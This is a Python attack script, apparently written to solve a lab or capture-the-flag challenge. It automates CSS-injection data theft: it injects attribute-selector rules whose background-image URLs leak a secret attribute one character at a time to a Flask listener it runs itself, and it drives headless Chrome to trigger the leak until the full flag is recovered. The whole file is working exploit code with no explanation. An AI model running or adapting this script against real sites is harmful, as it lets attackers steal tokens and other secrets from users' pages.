import requests
import string
import time
import threading
import os
from flask import Flask, request, cli
import sys

# --- 检查并导入Selenium ---
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.chrome.options import Options as ChromeOptions
except ImportError:
    print("[!] Selenium或其相关模块未安装。")
    print("[!] 请运行 'pip install selenium' 来安装它。")
    exit()

# --- 配置 ---
VICTIM_URL = "http://127.0.0.1:5001"
ATTACKER_HOST = "127.0.0.1"
ATTACKER_PORT = 8000
# 调试开关：设置为False会弹出浏览器窗口，方便观察
HEADLESS_MODE = True

# --- 全局共享变量 ---
leaked_character = None

# --- 监听服务器部分 ---
app = Flask(__name__)
# 减少Flask在控制台的日志输出
cli.show_server_banner = lambda *args: None
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def leak_receiver(path):
    global leaked_character
    char = request.args.get('leak')
    # 只有在攻击循环中才打印，避免健康检查的干扰
    if '正在为' in last_status_message:
        print(f"\n[监听服务器]: 收到泄露请求! Leak: '{char}'")
    if char:
        leaked_character = char
    return "OK", 200

def run_listener_server():
    """在后台线程中运行监听服务器"""
    app.run(host=ATTACKER_HOST, port=ATTACKER_PORT)

# --- 全自动攻击逻辑 ---
last_status_message = ""
def start_automated_attack():
    global leaked_character, last_status_message
    
    # -- 初始化Selenium WebDriver --
    print("[*] 正在初始化自动化浏览器 (Selenium)...")
    chrome_options = ChromeOptions()
    if HEADLESS_MODE:
        chrome_options.add_argument("--headless")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    
    driver_path = "./chromedriver"
    if not os.path.exists(driver_path) and not os.path.exists(driver_path + '.exe'):
         print(f"[!] 错误: 在 '{driver_path}' 未找到ChromeDriver。")
         return

    service = ChromeService(executable_path=driver_path)
    try:
        driver = webdriver.Chrome(service=service, options=chrome_options)
    except Exception as e:
        print(f"[!] 初始化WebDriver失败: {e}")
        return
        
    print("[*] 自动化浏览器初始化成功！")

    # -- 开始攻击循环 --
    charset = string.ascii_letters + string.digits + "_-!{}"
    leaked_flag = ""

    print(f"[*] 全自动攻击开始... 目标: {VICTIM_URL}")
    print("-" * 50)

    while True:
        leaked_character = None
        
        # 1. 构建CSS Payload
        rules = []
        # ★★★ 新增规则：将目标元素移出屏幕外，但保持其“可见”状态 ★★★
        hide_rule = '#secret-holder { position: absolute; top: -9999px; left: -9999px; }'
        rules.append(hide_rule)
        
        for char in charset:
            test_string = leaked_flag + char
            selector = f'#secret-holder[data-secret^="{test_string}"]'
            attacker_url = f'http://{ATTACKER_HOST}:{ATTACKER_PORT}/?leak={char}'
            rules.append(f'{selector} {{ background-image: url("{attacker_url}"); }}')
        css_payload = "\n".join(rules)
        
        # 2. 注入CSS
        last_status_message = f"\n[*] 正在为 '{leaked_flag}' 之后的字符注入CSS..."
        print(last_status_message)
        try:
            requests.post(f"{VICTIM_URL}/inject", data={'css': css_payload}, timeout=2)
        except requests.exceptions.RequestException:
            print(f"\n[!] 注入CSS失败。请确认app.py正在运行。")
            driver.quit()
            return

        # 3. 自动化触发泄露
        print(f"[*] 操作浏览器访问 {VICTIM_URL}/victim ...")
        driver.get(f"{VICTIM_URL}/victim")
        
        # ★★★ 新增：显式等待，确保目标元素已加载，让攻击更稳定 ★★★
        try:
            WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.ID, "secret-holder"))
            )
        except Exception:
            print("[!] 警告: 在页面上未找到 #secret-holder 元素。请确认victim.html已正确修改。")
            
        # 4. 轮询等待结果
        print("[*] 等待泄露数据回传 (最多5秒)...")
        found_this_round = False
        for i in range(50): # 轮询5秒
            if leaked_character:
                found_this_round = True
                break
            time.sleep(0.1)
            sys.stdout.write(f"\r[*] 等待中... {i+1}/50")
            sys.stdout.flush()

        # 5. 处理结果
        if found_this_round:
            leaked_flag += leaked_character
            sys.stdout.write(f"\r[+] 成功! Flag: {leaked_flag}{' ' * 20}\n") # 清理行尾
            sys.stdout.flush()

            if leaked_character == '}':
                print("\n" + "=" * 50)
                print(f"🎉 攻击完成! 完整Flag: {leaked_flag}")
                print("=" * 50)
                break
        else:
            print(f"\n[!] 攻击中止。在尝试 '{leaked_flag}' 后未收到下一个字符。")
            print("[!] 请再次确认app.py和victim.html已正确修改并重启。")
            break
            
    # 6. 清理资源
    driver.quit()
    print("\n[*] 自动化浏览器已关闭。")
    os._exit(0)

if __name__ == '__main__':
    # 启动后台监听服务器
    listener_thread = threading.Thread(target=run_listener_server, daemon=True)
    listener_thread.start()
    
    # 循环检查，直到监听服务器成功启动并响应
    print("[*] 等待监听服务器上线...")
    while True:
        try:
            requests.get(f"http://{ATTACKER_HOST}:{ATTACKER_PORT}/", timeout=1)
            print("[*] 监听服务器已上线！")
            break
        except requests.ConnectionError:
            time.sleep(0.2)

    # 启动主攻击逻辑
    start_automated_attack()
